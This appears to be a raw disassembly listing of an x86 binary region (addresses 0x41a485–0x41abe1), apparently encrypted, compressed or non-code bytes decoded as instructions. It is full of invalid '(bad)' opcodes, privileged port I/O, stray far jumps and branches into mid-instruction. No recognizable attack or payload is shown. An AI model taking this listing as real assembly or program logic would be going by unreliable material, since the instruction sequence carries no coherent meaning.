  41a485:	cmp    BYTE PTR [eax+0x2],al
  41a488:	cmc    
  41a489:	cdq    
  41a48a:	repnz ss in eax,0x19
  41a48e:	lock push 0x38
  41a491:	add    ah,BYTE PTR ds:0x98367afa
  41a497:	scas   al,BYTE PTR es:[edi]
  41a498:	imul   esp,DWORD PTR cs:[edi+0x7269775a],0x99bb7d9b
  41a4a3:	inc    esi
  41a4a4:	psllq  mm4,mm5
  41a4a7:	xchg   BYTE PTR [esi+eiz*8],dh
  41a4aa:	and    ah,cl
  41a4ac:	daa    
  41a4ad:	shl    ch,cl
  41a4af:	pop    es
  41a4b0:	jl     0x41a50b
  41a4b2:	cld    
  41a4b3:	xchg   esi,eax
  41a4b4:	mov    ds:0xfdfba6ba,eax
  41a4b9:	into   
  41a4ba:	pop    edx
  41a4bb:	(bad)  
  41a4bc:	dec    ebp
  41a4bd:	push   esp
  41a4be:	jne    0x41a4d3
  41a4c0:	mov    esp,0xc2d07c77
  41a4c5:	fadd   DWORD PTR [edi+edx*4+0x11e196ae]
  41a4cc:	mov    esp,0xdf53b2c9
  41a4d1:	les    esp,FWORD PTR [ebx]
  41a4d3:	xor    dh,dh
  41a4d5:	inc    esi
  41a4d6:	faddp  st(1),st
  41a4d8:	mov    eax,ds:0x5469db88
  41a4dd:	out    0xa4,eax
  41a4df:	xchg   ecx,eax
  41a4e0:	mov    eax,0x91a012ca
  41a4e5:	or     bl,BYTE PTR [ecx]
  41a4e7:	mov    esp,0xa2b96dcb
  41a4ec:	sbb    bh,BYTE PTR [eax]
  41a4ee:	xor    DWORD PTR [ecx],esi
  41a4f0:	ror    DWORD PTR [ecx+eiz*4-0x71],0xaf
  41a4f5:	ds add dh,dh
  41a4f8:	mov    esp,0xb86a8ade
  41a4fd:	lds    esi,FWORD PTR [ebx]
  41a4ff:	mov    ds:0xf9203fb7,al
  41a504:	test   eax,0xf17bbb78
  41a509:	lock add ebx,edx
  41a50c:	cmp    ebp,ebp
  41a50e:	and    DWORD PTR [ecx+ecx*2+0x3a],0xffffffd5
  41a513:	or     edi,DWORD PTR [ebx]
  41a515:	enter  0x397a,0xce
  41a519:	into   
  41a51a:	add    BYTE PTR [ebx+0x73],ah
  41a51d:	pop    esp
  41a51e:	jnp    0x41a4bc
  41a520:	iret   
  41a521:	je     0x41a4de
  41a523:	mov    edx,0xb46c74b1
  41a528:	fs and eax,0xe23ce010
  41a52e:	pusha  
  41a52f:	jmp    0x67fe86a6
  41a534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a535:	adc    cl,BYTE PTR ds:0x8510e9c4
  41a53b:	arpl   WORD PTR [edx-0x56],di
  41a53e:	das    
  41a53f:	outs   dx,DWORD PTR ds:[esi]
  41a540:	aad    0xf9
  41a542:	mov    BYTE PTR [eax+0x64e3fd8b],ah
  41a548:	sahf   
  41a549:	mov    ebp,0x6eae974a
  41a54e:	arpl   ax,di
  41a550:	retf   
  41a551:	addr16 cmc 
  41a553:	mov    bl,0xf4
  41a555:	sbb    eax,0x473bafba
  41a55a:	mov    ch,0x2b
  41a55c:	pop    edx
  41a55d:	push   esp
  41a55e:	mov    ebp,0x56b4941b
  41a563:	mov    edi,0x85469298
  41a568:	test   eax,0x2aa7dc0f
  41a56d:	inc    ebp
  41a56e:	std    
  41a56f:	pop    ss
  41a570:	fild   DWORD PTR [eax+0x53]
  41a573:	inc    ebx
  41a574:	pop    ecx
  41a575:	dec    ebp
  41a576:	ins    DWORD PTR es:[edi],dx
  41a577:	inc    ebp
  41a578:	loope  0x41a5e9
  41a57a:	clc    
  41a57b:	xchg   edx,eax
  41a57c:	or     eax,0xf7055fec
  41a581:	push   eax
  41a582:	xchg   edi,eax
  41a583:	xor    eax,0x1ab3033d
  41a588:	ja     0x41a5dd
  41a58a:	push   0x32
  41a58c:	fwait
  41a58d:	daa    
  41a58e:	xchg   edi,eax
  41a58f:	loopne 0x41a553
  41a591:	push   eax
  41a592:	ret    0xc9b6
  41a595:	(bad)  [edi+esi*8]
  41a598:	cld    
  41a599:	inc    ecx
  41a59a:	cmp    al,0x95
  41a59c:	lahf   
  41a59d:	xchg   edi,eax
  41a59e:	loope  0x41a572
  41a5a0:	(bad)  
  41a5a2:	pop    ebx
  41a5a3:	jp     0x41a5ce
  41a5a5:	(bad)  [eax]
  41a5a7:	rol    DWORD PTR [ebx-0x4],1
  41a5aa:	dec    BYTE PTR [ecx]
  41a5ac:	(bad)  
  41a5ae:	pop    ds
  41a5af:	push   ecx
  41a5b0:	in     al,dx
  41a5b1:	lahf   
  41a5b2:	xchg   edi,eax
  41a5b3:	push   esp
  41a5b4:	fwait
  41a5b5:	adc    al,0xac
  41a5b7:	ins    DWORD PTR es:[edi],dx
  41a5b8:	(bad)  
  41a5b9:	(bad)
  41a5bd:	(bad)  
  41a5be:	mov    edx,0x9ca2c8fc
  41a5c3:	std    
  41a5c4:	xchg   ebp,eax
  41a5c5:	dec    ebp
  41a5c6:	popf   
  41a5c7:	mov    WORD PTR [eax-0x5922eae8],cs
  41a5cd:	or     BYTE PTR [ebp-0x36],0x7f
  41a5d1:	jno    0x41a5dc
  41a5d3:	ds pop es
  41a5d5:	push   edi
  41a5d6:	dec    esp
  41a5d7:	mov    eax,0xb5de681e
  41a5dc:	jp     0x41a5d2
  41a5de:	pop    ebp
  41a5df:	frstor [edx-0x7a]
  41a5e2:	(bad)  
  41a5e4:	or     ah,0x65
  41a5e7:	aaa    
  41a5e8:	jmp    0x41a589
  41a5ea:	ins    BYTE PTR es:[edi],dx
  41a5eb:	mov    BYTE PTR [ebx+0x3c],ch
  41a5ee:	scas   eax,DWORD PTR es:[edi]
  41a5ef:	mov    BYTE PTR [esi-0x6b],dl
  41a5f2:	lods   eax,DWORD PTR ds:[esi]
  41a5f3:	shr    edi,cl
  41a5f5:	mov    ah,0xc0
  41a5f7:	shl    bh,1
  41a5f9:	mov    edx,0x203ff81f
  41a5fe:	xchg   esp,eax
  41a5ff:	inc    esp
  41a600:	or     al,0x71
  41a602:	fistp  DWORD PTR [eax]
  41a604:	daa    
  41a605:	fsubp  st(6),st
  41a607:	xor    eax,0x997b687c
  41a60c:	lock ror DWORD PTR [esi],1
  41a60f:	test   eax,0xb1a56b9d
  41a614:	test   ebp,ebp
  41a616:	lods   al,BYTE PTR ds:[esi]
  41a617:	out    0x2c,eax
  41a619:	mov    edx,0xeb0d9432
  41a61e:	test   DWORD PTR [ebx+edi*2+0x1d6362c1],ebx
  41a625:	mov    cl,0xe
  41a627:	cli    
  41a628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a629:	loop   0x41a665
  41a62b:	xchg   ebx,eax
  41a62c:	outs   dx,DWORD PTR ds:[esi]
  41a62d:	ror    ebx,1
  41a62f:	hlt    
  41a630:	aas    
  41a631:	fcom   QWORD PTR [edi]
  41a633:	std    
  41a634:	(bad)  
  41a635:	jbe    0x41a5ec
  41a637:	ffree  st(5)
  41a639:	out    0xa2,eax
  41a63b:	pusha  
  41a63c:	arpl   WORD PTR [ebp-0x7294f090],sp
  41a642:	pop    esi
  41a643:	mov    al,ds:0xb67aef9a
  41a648:	icebp  
  41a649:	imul   esi,DWORD PTR [ebx+0x4f8e215f],0xffffffca
  41a650:	ja     0x41a65f
  41a652:	or     dl,BYTE PTR [ecx+0x1c]
  41a655:	mov    esi,cs
  41a657:	mov    ds:0xc887b20b,eax
  41a65c:	mov    ds:0x96d247b0,al
  41a661:	xchg   edx,eax
  41a662:	imul   ecx,DWORD PTR [eax+0x31],0xfa2ac860
  41a669:	lea    ecx,[ebp+0x2d93f669]
  41a66f:	retf   0xc58
  41a672:	xchg   ecx,eax
  41a673:	fidivr DWORD PTR [ebp+0x6f]
  41a676:	sub    cl,BYTE PTR [edx]
  41a678:	outs   dx,BYTE PTR ds:[esi]
  41a679:	stos   DWORD PTR es:[edi],eax
  41a67a:	mov    dl,0x15
  41a67c:	in     eax,0x83
  41a67e:	pop    eax
  41a67f:	repnz mov cl,BYTE PTR [esi]
  41a682:	sub    al,0xc
  41a684:	loop   0x41a621
  41a686:	retf   0xe2e4
  41a689:	scas   eax,DWORD PTR es:[edi]
  41a68a:	stos   BYTE PTR es:[edi],al
  41a68b:	push   0x8cb0cefd
  41a690:	or     BYTE PTR [eax-0x1339f4c4],ah
  41a696:	sub    BYTE PTR [esi-0x2b60064e],dl
  41a69c:	push   ss
  41a69d:	fisubr WORD PTR [edx+0x597ef7e]
  41a6a3:	mov    dl,BYTE PTR [ebx+0x5a]
  41a6a6:	and    eax,0x34d57a18
  41a6ab:	push   es
  41a6ac:	not    DWORD PTR [ecx+0x5b3a40a8]
  41a6b2:	je     0x41a698
  41a6b4:	inc    esi
  41a6b5:	mov    gs,edx
  41a6b7:	mov    ebp,0x13d0b726
  41a6bc:	pop    ss
  41a6bd:	or     BYTE PTR cs:[edx],al
  41a6c0:	test   BYTE PTR [esi],cl
  41a6c2:	fidiv  WORD PTR [ecx]
  41a6c4:	push   es
  41a6c5:	stos   DWORD PTR es:[edi],eax
  41a6c6:	mov    ds:0x60eb7268,al
  41a6cb:	add    esp,ebp
  41a6cd:	les    ecx,FWORD PTR ds:0x80871355
  41a6d3:	arpl   WORD PTR [eax+0x2e5d688b],bp
  41a6d9:	js     0x41a706
  41a6db:	push   cs
  41a6dc:	jge    0x41a724
  41a6de:	sbb    DWORD PTR [esi+0x65],0x6e
  41a6e2:	aad    0xbf
  41a6e4:	pop    eax
  41a6e5:	adc    eax,0xf4d676d0
  41a6ea:	xchg   esi,eax
  41a6eb:	xor    DWORD PTR [ebx+0x35],0xfffffff0
  41a6ef:	jmp    0xe80b:0xa1af6f67
  41a6f6:	xchg   DWORD PTR [edx-0x399b7fda],eax
  41a6fc:	adc    al,0xf8
  41a6fe:	inc    ecx
  41a6ff:	repz cmp al,0xac
  41a702:	mov    al,0x52
  41a704:	cmp    BYTE PTR [ebx+edi*2-0x30af1002],0xd
  41a70c:	mov    al,0x1b
  41a70e:	pop    edx
  41a70f:	gs sbb ebx,ecx
  41a712:	or     ah,BYTE PTR [edi+eax*4-0x6f]
  41a716:	dec    ebx
  41a717:	push   edi
  41a718:	cmp    DWORD PTR [eax],ecx
  41a71a:	stos   DWORD PTR es:[edi],eax
  41a71b:	pop    ss
  41a71c:	shl    DWORD PTR [ebx],0x67
  41a71f:	inc    eax
  41a720:	mov    ecx,0x39ce2361
  41a725:	(bad)  
  41a726:	int    0xf3
  41a728:	inc    edi
  41a729:	repnz sbb eax,0xbcc859d5
  41a72f:	adc    DWORD PTR [edx],esp
  41a731:	add    eax,0xc22c030a
  41a736:	addr16 ret 0x48bf
  41a73a:	or     BYTE PTR [eax-0x31],dh
  41a73d:	hlt    
  41a73e:	jecxz  0x41a79c
  41a740:	xor    dh,BYTE PTR [edi+0x6a]
  41a743:	pop    edi
  41a744:	out    dx,al
  41a745:	dec    esi
  41a746:	stc    
  41a747:	dec    esi
  41a748:	int3   
  41a749:	(bad)  
  41a74a:	pop    eax
  41a74b:	inc    edi
  41a74c:	lds    esp,FWORD PTR [edi+0x69b08d85]
  41a752:	add    eax,0x2e5defaf
  41a757:	jns    0x41a726
  41a759:	shr    BYTE PTR [esi+eiz*2],0x6d
  41a75d:	loop   0x41a7c7
  41a75f:	adc    BYTE PTR [ebx-0x5969292f],0x52
  41a766:	stos   BYTE PTR es:[edi],al
  41a767:	outs   dx,DWORD PTR ds:[esi]
  41a768:	pop    esi
  41a769:	mov    al,ds:0xcca4abed
  41a76e:	lock stos BYTE PTR es:[edi],al
  41a770:	adc    DWORD PTR [edi],edx
  41a772:	sbb    DWORD PTR [edx+ecx*8+0x77],0xffffffcd
  41a777:	xchg   BYTE PTR [ebp-0x39e7d835],dh
  41a77d:	mov    edi,0xdf99f080
  41a782:	cmp    cl,al
  41a784:	cli    
  41a785:	scas   al,BYTE PTR es:[edi]
  41a786:	cmp    edx,ecx
  41a788:	jle    0x41a7e2
  41a78a:	lds    ebp,FWORD PTR [edi+0x78]
  41a78d:	cs data16 loop 0x41a7f0
  41a791:	inc    edi
  41a792:	bound  ebp,QWORD PTR [edi+ebx*2]
  41a795:	outs   dx,BYTE PTR ds:[esi]
  41a796:	(bad)  
  41a797:	mov    ch,0x87
  41a799:	data16 jae 0x41a720
  41a79c:	dec    ebx
  41a79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a79e:	dec    esi
  41a79f:	(bad)  
  41a7a0:	push   edx
  41a7a1:	(bad)  [ebp+0x78]
  41a7a4:	and    DWORD PTR [ebx],edi
  41a7a6:	mov    ecx,0x6efc3eb6
  41a7ab:	mov    cl,ah
  41a7ad:	and    esp,DWORD PTR [esp-0x3aec6b2e]
  41a7b4:	xchg   cl,al
  41a7b6:	mov    ch,0xf4
  41a7b8:	push   cs
  41a7b9:	add    DWORD PTR [eax],esi
  41a7bb:	mov    ss,ecx
  41a7bd:	cmc    
  41a7be:	or     edi,DWORD PTR [ebp+0x12]
  41a7c1:	in     eax,dx
  41a7c2:	cld    
  41a7c3:	jno    0x41a7bc
  41a7c5:	fild   DWORD PTR [eax]
  41a7c7:	(bad)  
  41a7c8:	shr    BYTE PTR [edx+0x18f55b6e],1
  41a7ce:	lahf   
  41a7cf:	jmp    0x41a81f
  41a7d1:	sbb    al,ah
  41a7d3:	cmp    DWORD PTR ds:0x275d9a75,ebp
  41a7d9:	mov    WORD PTR ds:0x581b599b,cs
  41a7df:	dec    esp
  41a7e0:	sbb    ecx,edx
  41a7e2:	inc    ecx
  41a7e3:	xor    eax,0x3826edef
  41a7e8:	cs ror cl,cl
  41a7eb:	std    
  41a7ec:	add    DWORD PTR [esp+eax*1+0x6e],edi
  41a7f0:	xchg   esp,eax
  41a7f1:	jnp    0x41a793
  41a7f3:	ins    DWORD PTR es:[edi],dx
  41a7f4:	jns    0x41a77f
  41a7f6:	ss pop ebx
  41a7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7f9:	arpl   WORD PTR [ecx+0x75],dx
  41a7fc:	rol    DWORD PTR [edi],0x9
  41a7ff:	ins    DWORD PTR es:[edi],dx
  41a800:	cmp    eax,DWORD PTR [esi]
  41a802:	jp     0x41a859
  41a804:	sti    
  41a805:	cmp    esi,ecx
  41a807:	push   0xffffffd5
  41a809:	xchg   ebx,eax
  41a80a:	add    al,BYTE PTR [edi]
  41a80c:	imul   esp,DWORD PTR [esi+0x37ece40e],0x7cdc4d89
  41a816:	jmp    0xd339a2e
  41a81b:	xchg   edi,eax
  41a81c:	xchg   ecx,eax
  41a81d:	rol    DWORD PTR [ebp+0x7d],0xc7
  41a821:	dec    ebp
  41a822:	std    
  41a823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a824:	mov    eax,0x9604c214
  41a829:	xor    edx,DWORD PTR [ebp+ebp*8-0x1f64972a]
  41a830:	adc    eax,0x545a618b
  41a835:	dec    esi
  41a836:	aas    
  41a837:	test   eax,0xf1cb466c
  41a83c:	call   0x9b89:0x2f7cf032
  41a843:	je     0x41a819
  41a845:	cmp    BYTE PTR [edi-0x4d],bh
  41a848:	les    ebx,FWORD PTR [esi+0x61015a73]
  41a84e:	loop   0x41a7ee
  41a850:	les    edi,FWORD PTR [eax]
  41a852:	mov    bh,0x97
  41a854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a855:	aaa    
  41a856:	adc    ebp,esi
  41a858:	and    edx,DWORD PTR ds:0xc376df80
  41a85e:	mov    dl,0x5e
  41a860:	sub    al,0x7b
  41a862:	push   ebp
  41a863:	jae    0x41a89d
  41a865:	jecxz  0x41a8a1
  41a867:	mov    ds:0xdac805dc,eax
  41a86c:	xlat   BYTE PTR ds:[ebx]
  41a86d:	test   DWORD PTR [edx+ecx*8],ecx
  41a870:	xchg   ecx,eax
  41a871:	pop    ss
  41a872:	stos   BYTE PTR es:[edi],al
  41a873:	mov    edi,0xee5114d8
  41a878:	jne    0x41a89e
  41a87a:	xor    DWORD PTR [eax-0x4d],ebp
  41a87d:	fcmovu st,st(2)
  41a87f:	inc    ecx
  41a880:	mov    bl,0x20
  41a882:	mov    gs,WORD PTR [esi+0x79c4fc83]
  41a888:	movntps XMMWORD PTR es:[ebx+esi*1-0x1a2bf879],xmm6
  41a891:	push   ebx
  41a892:	popa   
  41a893:	cmp    DWORD PTR [edx-0x6a18c800],edi
  41a899:	xor    ch,ch
  41a89b:	xor    BYTE PTR [ebp-0x2eac366a],dh
  41a8a1:	and    DWORD PTR [eax],0x57755d13
  41a8a7:	loop   0x41a8f5
  41a8a9:	aad    0xa
  41a8ab:	sub    eax,0xf265cf98
  41a8b0:	pushf  
  41a8b1:	into   
  41a8b2:	jb     0x41a84a
  41a8b4:	mov    ebp,0x2e73552f
  41a8b9:	repz gs sti 
  41a8bc:	and    BYTE PTR [edx-0x4],ah
  41a8bf:	inc    eax
  41a8c0:	sub    eax,0x84bf612c
  41a8c5:	outs   dx,DWORD PTR ds:[esi]
  41a8c6:	aaa    
  41a8c7:	jbe    0x41a8dc
  41a8c9:	test   al,0xd6
  41a8cb:	sbb    al,0x4d
  41a8cd:	adc    BYTE PTR ss:[ecx],bl
  41a8d0:	push   edi
  41a8d1:	mov    esi,0x68fd1271
  41a8d6:	mov    esp,DWORD PTR [edx]
  41a8d8:	cmp    bh,0xdd
  41a8db:	adc    DWORD PTR [ebp-0x27],ecx
  41a8de:	dec    edi
  41a8df:	xor    BYTE PTR [ebp-0x404781f3],dh
  41a8e5:	nop
  41a8e6:	loope  0x41a95d
  41a8e8:	fwait
  41a8e9:	jle    0x41a88d
  41a8eb:	xor    BYTE PTR [edi+0x5a],0xe4
  41a8ef:	jae    0x41a8a1
  41a8f1:	dec    ebx
  41a8f2:	fistp  QWORD PTR [edi-0x28]
  41a8f5:	inc    ebx
  41a8f6:	adc    DWORD PTR [edx+ecx*2-0x3ca96834],0xe
  41a8fe:	and    al,bh
  41a900:	adc    eax,0x9a36ff2c
  41a905:	xor    bl,BYTE PTR [ebp+0x28ee256d]
  41a90b:	lahf   
  41a90c:	mov    eax,ds:0xfa8f8cdb
  41a911:	mov    edx,DWORD PTR [ebp+esi*8-0x1e]
  41a915:	into   
  41a916:	jg     0x41a910
  41a918:	jae    0x41a97e
  41a91a:	adc    al,0xbd
  41a91c:	xor    ecx,DWORD PTR [edx-0x3f482703]
  41a922:	cli    
  41a923:	jmp    0x41a8ea
  41a925:	inc    esi
  41a926:	xchg   ecx,eax
  41a927:	sub    bl,cl
  41a929:	push   0x4169243e
  41a92e:	mov    esp,0xe6fe467b
  41a933:	add    DWORD PTR [esi-0x2dd332fa],0x70
  41a93a:	mov    edx,0xeac66fbc
  41a93f:	stos   BYTE PTR es:[edi],al
  41a940:	jae    0x41a95c
  41a942:	dec    esi
  41a943:	scas   al,BYTE PTR es:[edi]
  41a944:	in     eax,dx
  41a945:	xchg   edx,eax
  41a946:	test   DWORD PTR [edi+ebx*2],0x2fa5025c
  41a94d:	idiv   BYTE PTR [ebp+0x3017d788]
  41a953:	adc    bh,BYTE PTR [ecx+edx*1]
  41a956:	xchg   edx,eax
  41a957:	sbb    ebp,0x7ef12b6b
  41a95d:	scas   al,BYTE PTR es:[edi]
  41a95e:	leave  
  41a95f:	ins    DWORD PTR es:[edi],dx
  41a960:	gs push cs
  41a962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a963:	or     BYTE PTR [esi+0x32],bl
  41a966:	mov    esi,0x1f4c7d21
  41a96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a96c:	mov    ds:0x52fdb2d8,eax
  41a971:	cdq    
  41a972:	jns    0x41a9ab
  41a974:	ins    DWORD PTR es:[edi],dx
  41a975:	mov    al,ds:0x38df6cb8
  41a97a:	into   
  41a97b:	push   eax
  41a97c:	and    BYTE PTR [eax+0x43a04d05],0x6b
  41a983:	in     eax,0xb5
  41a985:	add    bl,ah
  41a987:	or     bl,BYTE PTR [ebx-0x29a7da9a]
  41a98d:	jmp    0xae10cf2d
  41a992:	outs   dx,BYTE PTR ds:[esi]
  41a993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a994:	lock cli 
  41a996:	(bad)  
  41a997:	lods   eax,DWORD PTR ds:[esi]
  41a998:	pop    ss
  41a999:	dec    esi
  41a99a:	jg     0x41a97b
  41a99c:	fdivrp st(1),st
  41a99e:	pop    es
  41a99f:	adc    BYTE PTR [edi],bh
  41a9a1:	leave  
  41a9a2:	fiadd  DWORD PTR [edi+0x5d]
  41a9a5:	test   BYTE PTR [ebx-0x21],bl
  41a9a8:	in     eax,dx
  41a9a9:	pop    ecx
  41a9aa:	call   0x5c4f97a1
  41a9af:	mov    esp,0xb8997721
  41a9b4:	mov    esi,0x10d7493e
  41a9b9:	sbb    cl,BYTE PTR [eax+0x258d92a5]
  41a9bf:	push   edx
  41a9c0:	xchg   edi,eax
  41a9c1:	jmp    0xebd85c39
  41a9c6:	sbb    eax,0xc665e1c9
  41a9cb:	mov    ah,al
  41a9cd:	cmp    al,0x44
  41a9cf:	sub    DWORD PTR [edi],eax
  41a9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d2:	ins    DWORD PTR es:[edi],dx
  41a9d3:	mov    edx,0x281f4fef
  41a9d8:	or     BYTE PTR [ebx],0xd6
  41a9db:	ds pop esp
  41a9dd:	arpl   WORD PTR [edx],cx
  41a9df:	pop    edi
  41a9e0:	mov    eax,ds:0xdcdc8014
  41a9e5:	push   edi
  41a9e6:	xor    bl,BYTE PTR [edx+0x91c830b]
  41a9ec:	rcr    DWORD PTR [eax],1
  41a9ee:	xchg   ebp,ecx
  41a9f0:	mov    cl,0x5e
  41a9f2:	lods   eax,DWORD PTR ds:[esi]
  41a9f3:	cli    
  41a9f4:	and    al,0x6d
  41a9f6:	add    al,0x2c
  41a9f8:	sbb    DWORD PTR [edi],ebp
  41a9fa:	lock (bad) 
  41a9fc:	loopne 0x41a9c2
  41a9fe:	xchg   ebx,eax
  41a9ff:	mov    ah,0x71
  41aa01:	push   eax
  41aa02:	jnp    0x41aa57
  41aa04:	dec    eax
  41aa05:	mov    ds:0x73a72833,eax
  41aa0a:	into   
  41aa0b:	sbb    BYTE PTR [edx-0x172db600],0xc4
  41aa12:	add    BYTE PTR [eax-0x5a],0x4e
  41aa16:	sbb    al,0x50
  41aa18:	jmp    0x37d7:0x4df41571
  41aa1f:	(bad)  
  41aa20:	mov    eax,0x64af1921
  41aa25:	adc    al,0xa4
  41aa27:	xchg   ecx,eax
  41aa28:	ret    
  41aa29:	repnz push ebx
  41aa2b:	cmp    eax,0xa794a776
  41aa30:	and    al,0xba
  41aa32:	adc    BYTE PTR [ecx+0x216ed090],bl
  41aa38:	dec    esp
  41aa39:	sub    eax,0xe3d1fd37
  41aa3e:	push   0xc7aa7a3c
  41aa43:	adc    al,0x27
  41aa45:	cmc    
  41aa46:	mov    bh,0x96
  41aa48:	fdivr  DWORD PTR ds:0xd1f093d9
  41aa4e:	ss inc eax
  41aa50:	sti    
  41aa51:	loop   0x41aa99
  41aa53:	(bad)  
  41aa54:	xor    eax,0xc7707e08
  41aa59:	mov    eax,0xe5ffdb7d
  41aa5e:	and    DWORD PTR ss:[esi],eax
  41aa61:	scas   eax,DWORD PTR es:[edi]
  41aa62:	add    BYTE PTR [esi],0x3b
  41aa65:	mov    bh,0x71
  41aa67:	inc    edi
  41aa68:	fistp  QWORD PTR [ebx]
  41aa6a:	std    
  41aa6b:	leave  
  41aa6c:	(bad)  
  41aa6d:	cmc    
  41aa6e:	scas   eax,DWORD PTR es:[edi]
  41aa6f:	mov    ds:0x565acf38,al
  41aa74:	into   
  41aa75:	push   0xffffffb0
  41aa77:	dec    eax
  41aa78:	ja     0x41aaca
  41aa7a:	mov    ds:0xaebf76f7,eax
  41aa7f:	add    DWORD PTR [edx+0x56],edi
  41aa82:	(bad)  
  41aa83:	fldl2t 
  41aa85:	push   0xffffff81
  41aa87:	cmp    bh,al
  41aa89:	stos   BYTE PTR es:[edi],al
  41aa8a:	mul    DWORD PTR [ebp+0x12]
  41aa8d:	call   DWORD PTR [edx-0x69d5cad6]
  41aa93:	or     bh,BYTE PTR [ebx+0x3d]
  41aa96:	dec    DWORD PTR [eax-0x793d4c5e]
  41aa9c:	or     eax,0x7c1046bf
  41aaa1:	mov    ds:0xe734af2e,eax
  41aaa6:	xchg   BYTE PTR [edx-0x47a08a63],bl
  41aaac:	sbb    edi,DWORD PTR [ebx-0x442e47e8]
  41aab2:	scas   eax,DWORD PTR es:[edi]
  41aab3:	jbe    0x41ab16
  41aab5:	xor    BYTE PTR [eax+0x77],dh
  41aab8:	inc    ebx
  41aab9:	dec    ebp
  41aaba:	test   al,0xe4
  41aabc:	leave  
  41aabd:	and    DWORD PTR [ebx+0x24],eax
  41aac0:	pop    esp
  41aac1:	inc    ebp
  41aac2:	lods   eax,DWORD PTR gs:[esi]
  41aac4:	mov    eax,ds:0x3445abca
  41aac9:	cli    
  41aaca:	and    ebx,DWORD PTR [ebp+0x2e]
  41aacd:	dec    edx
  41aace:	lahf   
  41aacf:	adc    esi,edi
  41aad1:	sbb    ecx,edi
  41aad3:	jne    0x41ab08
  41aad5:	sub    BYTE PTR [esi+0x38],ah
  41aad8:	out    0xf6,eax
  41aada:	ds sbb al,0xde
  41aadd:	push   ebp
  41aade:	scas   eax,DWORD PTR es:[edi]
  41aadf:	mov    WORD PTR [esi-0x4c],?
  41aae2:	iret   
  41aae3:	cdq    
  41aae4:	pop    ebx
  41aae5:	loopne 0x41aaef
  41aae7:	stos   BYTE PTR es:[edi],al
  41aae8:	neg    esi
  41aaea:	add    al,0xfc
  41aaec:	xchg   ecx,eax
  41aaed:	mov    al,ds:0xeaf8867d
  41aaf2:	loope  0x41ab4d
  41aaf4:	daa    
  41aaf5:	fwait
  41aaf6:	fwait
  41aaf7:	inc    esp
  41aaf8:	lahf   
  41aaf9:	jp     0x41aaf1
  41aafb:	add    BYTE PTR [ebx+0x23],bh
  41aafe:	daa    
  41aaff:	gs jae 0x41aae2
  41ab02:	test   eax,0xe0ecd195
  41ab07:	fcmovnbe st,st(4)
  41ab09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab0a:	aaa    
  41ab0b:	mov    WORD PTR [edi],gs
  41ab0d:	add    BYTE PTR [ecx+0x48b7b75e],al
  41ab13:	and    cl,dh
  41ab15:	mov    edx,0x21e7158
  41ab1a:	pop    ds
  41ab1b:	push   0xfffffffa
  41ab1d:	xchg   DWORD PTR [ecx-0x4d],esi
  41ab20:	xor    DWORD PTR [edx+0xc],edx
  41ab23:	fidivr DWORD PTR [si-0x75]
  41ab27:	ror    ah,0x51
  41ab2a:	call   0x94ac:0x7d4e0fc0
  41ab31:	leave  
  41ab32:	cld    
  41ab33:	xchg   esi,eax
  41ab34:	sbb    bl,ch
  41ab36:	stos   DWORD PTR es:[edi],eax
  41ab37:	fisttp QWORD PTR [ecx+0x6c]
  41ab3a:	and    eax,0x155f58a6
  41ab3f:	bound  ecx,QWORD PTR [eax]
  41ab41:	(bad)  [ebp-0x683fd6b8]
  41ab47:	fnsave [esi]
  41ab49:	in     al,dx
  41ab4a:	out    dx,al
  41ab4b:	pop    esp
  41ab4c:	mov    ecx,0xc6a97d52
  41ab51:	add    al,BYTE PTR [ecx]
  41ab53:	ds jb  0x41ab53
  41ab56:	sbb    edi,esi
  41ab58:	cmp    ah,BYTE PTR [esp+edi*1]
  41ab5b:	inc    eax
  41ab5c:	fstp   TBYTE PTR [eax+0x496481e4]
  41ab62:	pop    ebx
  41ab63:	aaa    
  41ab64:	test   al,0x83
  41ab66:	and    eax,0xdd29de15
  41ab6b:	mov    ah,0x62
  41ab6d:	jg     0x41ab25
  41ab6f:	inc    ecx
  41ab70:	popf   
  41ab71:	gs ins BYTE PTR es:[edi],dx
  41ab73:	add    al,0x54
  41ab75:	test   BYTE PTR [ebp+0x6d],cl
  41ab78:	pop    ebx
  41ab79:	clc    
  41ab7a:	dec    edi
  41ab7b:	fdivr  DWORD PTR [esi-0x30f54d62]
  41ab81:	pop    esi
  41ab82:	adc    ebx,0x90a6f16c
  41ab88:	push   ds
  41ab89:	cwde   
  41ab8a:	sbb    dh,BYTE PTR [eax+edx*2-0x4]
  41ab8e:	into   
  41ab8f:	out    dx,al
  41ab90:	aad    0x7b
  41ab92:	xor    eax,0x59cd23ba
  41ab97:	ror    bh,0x85
  41ab9a:	mov    ecx,0x6e3d847d
  41ab9f:	cmp    DWORD PTR [esi],0x267deaa5
  41aba5:	xchg   ebx,eax
  41aba6:	icebp  
  41aba7:	hlt    
  41aba8:	lahf   
  41aba9:	jbe    0x41ab2d
  41abab:	inc    edi
  41abac:	dec    eax
  41abad:	pop    es
  41abae:	jns    0x41abc1
  41abb0:	adc    ch,BYTE PTR [ebx+edi*2]
  41abb3:	cmp    dl,BYTE PTR [eax+eax*1]
  41abb6:	pop    es
  41abb7:	bound  ecx,QWORD PTR [ecx-0x254a0431]
  41abbd:	add    ch,bh
  41abbf:	bound  ebp,QWORD PTR [ecx-0x3d]
  41abc2:	cmp    DWORD PTR [ebx-0x75],esp
  41abc5:	shl    DWORD PTR [edx+esi*4-0x45],cl
  41abc9:	pusha  
  41abca:	lods   al,BYTE PTR ds:[esi]
  41abcb:	jecxz  0x41abe6
  41abcd:	(bad)  
  41abce:	popa   
  41abcf:	fsubr  DWORD PTR [ebx]
  41abd1:	push   esp
  41abd2:	mov    eax,ds:0x40022dd7
  41abd7:	jmp    0x5715f9e8
  41abdc:	inc    DWORD PTR [eax]
  41abde:	pop    ebp
  41abdf:	test   al,0xbf
  41abe1:	jbe    0x41ab8f
